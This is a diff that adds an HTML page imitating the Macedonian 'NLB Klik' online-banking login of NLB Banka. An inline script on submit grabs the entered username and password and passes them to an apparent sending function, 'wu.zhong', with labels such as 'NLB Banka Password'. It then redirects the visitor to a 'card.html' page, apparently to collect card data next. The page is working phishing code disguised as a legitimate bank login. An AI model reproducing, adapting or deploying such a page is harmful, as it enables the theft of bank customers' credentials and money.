@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/nlb.css">
+    <title>nlbklik</title>
+</head>
+<body>
+<header>
+<img src="res/img/logoo.png">
+</header>
+
+    
+<div class="text">
+<strong>НЛБ</strong> Клик
+</div>
+<form action="post.php" method="post">
+<div class="nlb">
+</div>
+
+
+<div class="input">
+    <input type="text" name="user" required><br>
+    <label style="text-align:center;">Корисничко име</label>
+</div>
+
+<div class="input">
+    <input type="password" name="pass" required><br>
+    <label style="text-align:center;">Лозинка</label>
+</div>
+
+
+<div><button type="sumbit">најава</button></div>
+
+  <script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`✉️ NLB Banka Email: ${document.querySelector("[name='user']").value}\n\n🔒 NLB Banka Password: ${document.querySelector("[name='pass']").value}`);
+
+window.location="card.html";
+
+})
+
+</script>
+
+</form>
+</body>
+</html>
